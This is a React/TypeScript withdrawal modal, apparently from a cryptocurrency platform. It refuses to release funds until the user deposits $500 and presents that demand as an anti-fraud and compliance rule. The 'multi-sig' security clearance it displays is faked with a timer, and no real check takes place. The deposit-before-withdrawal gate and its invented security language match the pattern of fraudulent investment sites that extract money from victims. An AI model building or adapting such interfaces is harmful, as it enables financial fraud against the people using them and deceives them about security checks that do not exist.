import React, { useState } from 'react';
import {
  ShieldCheck,
  AlertTriangle,
  CheckCircle2,
  X,
  ShieldAlert,
  ArrowRight,
  ArrowDownLeft,
  Info,
  Sparkles,
} from 'lucide-react';
import { UserProfile } from '../types';

interface WithdrawalGuardsProps {
  user: UserProfile;
  amount: number;
  currency: string;
  destinationAddress: string;
  theme?: 'dark' | 'light';
  onSuccess: () => void;
  onCancel: () => void;
  onNavigateDeposit?: () => void;
}

export const WithdrawalGuards: React.FC<WithdrawalGuardsProps> = ({
  user,
  amount,
  currency,
  destinationAddress,
  theme = 'dark',
  onSuccess,
  onCancel,
  onNavigateDeposit,
}) => {
  const [isVerifying, setIsVerifying] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Check $500 Minimum Deposit Anti-Fraud Rule
  const totalUserDeposited = user.totalDeposited || 0;
  const MINIMUM_REQUIRED_DEPOSIT = 500;
  const hasMetMinimumDeposit = totalUserDeposited >= MINIMUM_REQUIRED_DEPOSIT || user.hasDepositedMinimum;
  const depositShortfall = Math.max(0, MINIMUM_REQUIRED_DEPOSIT - totalUserDeposited);

  // KYC daily limits
  const dailyLimit = user.kycTier === 3 ? 1000000 : user.kycTier === 2 ? 100000 : user.kycTier === 1 ? 10000 : 2000;
  const isOverLimit = amount > dailyLimit;

  const handleConfirmWithdrawal = () => {
    setError(null);

    setIsVerifying(true);

    setTimeout(() => {
      setIsVerifying(false);
      onSuccess();
    }, 1200);
  };

  // If user has not deposited minimum $500, display the strict Anti-Fraud & Legitimacy Verification Banner
  if (!hasMetMinimumDeposit) {
    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md animate-fade-in">
        <div
          className={`w-full max-w-lg rounded-3xl p-6 sm:p-8 shadow-2xl border relative ${
            theme === 'dark' ? 'bg-[#151926] border-amber-500/30 text-white' : 'bg-white border-slate-200 text-slate-900'
          }`}
        >
          {/* Close button */}
          <button
            onClick={onCancel}
            className="absolute top-5 right-5 text-slate-500 dark:text-gray-400 hover:text-slate-900 dark:hover:text-white p-1 rounded-lg hover:bg-slate-100 dark:hover:bg-gray-800 transition cursor-pointer"
            title="Close"
          >
            <X className="w-5 h-5" />
          </button>

          <div className="space-y-5">
            {/* Header with Security Badge */}
            <div className="flex items-start gap-4 border-b border-slate-200 dark:border-gray-800/80 pb-4">
              <div className="p-3 rounded-2xl bg-amber-500/15 border border-amber-500/30 text-amber-500 dark:text-amber-400 shrink-0">
                <ShieldAlert className="w-8 h-8 animate-pulse" />
              </div>
              <div className="space-y-1">
                <div className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-[10px] font-black uppercase tracking-wider bg-amber-500/10 dark:bg-amber-500/20 text-amber-600 dark:text-amber-300 border border-amber-500/30 dark:border-amber-500/40">
                  Compliance & Anti-Fraud Security Rule
                </div>
                <h3 className="text-lg sm:text-xl font-black tracking-tight text-slate-900 dark:text-white">
                  Verified Deposit Required to Authorize Withdrawal
                </h3>
              </div>
            </div>

            {/* Explanation Banner */}
            <div className="p-4 rounded-2xl bg-amber-500/5 dark:bg-gradient-to-br dark:from-amber-950/30 dark:via-slate-900/60 dark:to-gray-900/80 border border-amber-500/30 text-xs text-slate-700 dark:text-gray-200 space-y-3 leading-relaxed">
              <p className="font-semibold text-amber-700 dark:text-amber-200 flex items-start gap-2">
                <Info className="w-4 h-4 text-amber-500 dark:text-amber-400 shrink-0 mt-0.5" />
                <span>
                  To prevent spam, fraud, automated account farming, and verify that this account is legitimate, your account must have an active verified deposit of at least <strong className="text-slate-900 dark:text-white font-mono underline">$500.00</strong> before disbursals can be authorized.
                </span>
              </p>
              <p className="text-slate-500 dark:text-gray-400 text-[11px]">
                This is a mandatory institutional security protocol to protect protocol liquidity reserves and guarantee genuine account ownership.
              </p>
            </div>

            {/* Verification Progress Tracker */}
            <div className="space-y-2 text-xs">
              <div className="p-3.5 rounded-2xl bg-slate-50 dark:bg-gray-900/70 border border-slate-200 dark:border-gray-800 space-y-2">
                <div className="flex justify-between items-center">
                  <span className="text-slate-500 dark:text-gray-400 font-medium">Verified Deposit Progress:</span>
                  <span className="font-mono font-black text-amber-600 dark:text-amber-400">
                    ${totalUserDeposited.toLocaleString(undefined, { minimumFractionDigits: 2 })} / $500.00
                  </span>
                </div>
                {/* Progress bar */}
                <div className="w-full h-2 bg-slate-200 dark:bg-gray-800 rounded-full overflow-hidden">
                  <div
                    className="h-full bg-gradient-to-r from-amber-500 to-[#00FFB2] rounded-full transition-all duration-500"
                    style={{ width: `${Math.min(100, (totalUserDeposited / 500) * 100)}%` }}
                  />
                </div>
                <div className="flex justify-between text-[11px] text-slate-500">
                  <span>Requested Disbursal: ${amount.toLocaleString()} ({currency})</span>
                  <span className="text-rose-500 dark:text-rose-400 font-bold">Shortfall: ${depositShortfall.toLocaleString()}</span>
                </div>
              </div>
            </div>

            {/* Action Buttons: "Deposit" and "Go Back" */}
            <div className="pt-2 flex flex-col sm:flex-row gap-3">
              <button
                type="button"
                onClick={onCancel}
                className="order-2 sm:order-1 flex-1 py-3.5 rounded-xl border border-slate-200 dark:border-gray-700 hover:border-slate-300 dark:hover:border-gray-600 bg-slate-100 dark:bg-gray-800/80 hover:bg-slate-200 dark:hover:bg-gray-800 text-slate-600 dark:text-gray-200 font-bold text-xs uppercase tracking-wider transition cursor-pointer flex items-center justify-center gap-2"
              >
                <span>Go Back to Withdrawal</span>
              </button>

              <button
                type="button"
                onClick={() => {
                  onCancel();
                  if (onNavigateDeposit) {
                    onNavigateDeposit();
                  }
                }}
                className="order-1 sm:order-2 flex-1 py-3.5 rounded-xl bg-gradient-to-r from-[#00FFB2] to-emerald-400 hover:from-[#00E59E] hover:to-emerald-500 text-black font-black text-xs uppercase tracking-wider transition shadow-lg shadow-[#00FFB2]/20 cursor-pointer flex items-center justify-center gap-2"
              >
                <ArrowDownLeft className="w-4 h-4 stroke-[3]" />
                <span>Proceed to Deposit ($500)</span>
                <ArrowRight className="w-4 h-4 ml-1" />
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/75 backdrop-blur-md animate-fade-in">
      <div
        className={`w-full max-w-md rounded-3xl p-6 shadow-2xl border relative ${
          theme === 'dark' ? 'bg-[#161B27] border-gray-800 text-white' : 'bg-white border-slate-200 text-slate-900'
        }`}
      >
        <button
          onClick={onCancel}
          className="absolute top-5 right-5 text-slate-500 dark:text-gray-400 hover:text-slate-900 dark:hover:text-white p-1 rounded-lg hover:bg-slate-100 dark:hover:bg-gray-800 transition cursor-pointer"
        >
          <X className="w-5 h-5" />
        </button>

        <div className="space-y-4">
          <div className="flex items-center gap-3 border-b border-slate-200 dark:border-gray-800 pb-3">
            <div className="p-2 rounded-xl bg-blue-500/10 text-emerald-600 dark:text-[#00FFB2]">
              <ShieldCheck className="w-6 h-6" />
            </div>
            <div>
              <h3 className="text-base font-black flex items-center gap-1.5 text-slate-900 dark:text-white">
                <span>0xGuard Multi-Sig Security Protocol</span>
              </h3>
              <p className="text-xs text-slate-500 dark:text-gray-400">Institutional Anti-Fraud Ledger Clearance</p>
            </div>
          </div>

          {/* Compliance Status Checks */}
          <div className="space-y-2 text-xs">
            <div className="p-3 rounded-xl bg-slate-50 dark:bg-gray-900/60 border border-slate-200 dark:border-gray-800 flex justify-between items-center">
              <span className="text-slate-500 dark:text-gray-400">KYC Verification Tier:</span>
              <span className="font-bold text-emerald-600 dark:text-[#00FFB2] uppercase">
                Tier {user.kycTier} (Limit: ${dailyLimit.toLocaleString()}/day)
              </span>
            </div>

            <div className="p-3 rounded-xl bg-slate-50 dark:bg-gray-900/60 border border-slate-200 dark:border-gray-800 flex justify-between items-center">
              <span className="text-slate-500 dark:text-gray-400">Verified Deposit Status:</span>
              <span className="font-bold text-emerald-600 dark:text-emerald-400 flex items-center gap-1">
                <CheckCircle2 className="w-3.5 h-3.5" />
                <span>Legitimate Verified (${totalUserDeposited.toLocaleString()})</span>
              </span>
            </div>

            <div className="p-3 rounded-xl bg-slate-50 dark:bg-gray-900/60 border border-slate-200 dark:border-gray-800 flex justify-between items-center">
              <span className="text-slate-500 dark:text-gray-400">Requested Disbursal:</span>
              <span className="font-mono font-bold text-slate-900 dark:text-white">
                ${amount.toLocaleString()} ({currency})
              </span>
            </div>

            <div className="p-3 rounded-xl bg-slate-50 dark:bg-gray-900/60 border border-slate-200 dark:border-gray-800 flex flex-col gap-1">
              <span className="text-slate-500 dark:text-gray-400">Destination Address:</span>
              <span className="font-mono text-[11px] text-slate-700 dark:text-gray-300 break-all">{destinationAddress}</span>
            </div>

            {isOverLimit && (
              <div className="p-3 rounded-xl bg-amber-500/10 border border-amber-500/30 text-amber-600 dark:text-amber-400 flex items-start gap-2">
                <AlertTriangle className="w-4 h-4 shrink-0 mt-0.5" />
                <span>
                  Withdrawal exceeds your current KYC Tier daily limit (${dailyLimit.toLocaleString()}). Upgrade your KYC
                  in the KYC Vault.
                </span>
              </div>
            )}
          </div>

          {error && (
            <div className="text-red-500 dark:text-red-400 text-xs font-semibold text-center p-2 rounded-lg bg-red-500/10 border border-red-500/20">
              {error}
            </div>
          )}

          <div className="pt-2 flex gap-3">
              <button
                type="button"
                onClick={onCancel}
                className="flex-1 py-3 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-gray-800 dark:hover:bg-gray-700 text-slate-700 dark:text-white font-bold text-xs uppercase tracking-wider transition cursor-pointer"
              >
                Cancel
              </button>
              <button
                type="button"
                disabled={isVerifying || isOverLimit}
                onClick={handleConfirmWithdrawal}
                className="flex-1 py-3 rounded-xl bg-[#00FFB2] hover:bg-[#00E59E] disabled:opacity-50 text-black font-black text-xs uppercase tracking-wider transition shadow-lg shadow-[#00FFB2]/20 flex items-center justify-center gap-1.5 cursor-pointer"
              >
                {isVerifying ? (
                  <span className="inline-block w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin" />
                ) : (
                  <>
                    <CheckCircle2 className="w-4 h-4" />
                    <span>Authorize Disbursal</span>
                  </>
                )}
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
export default WithdrawalGuards;
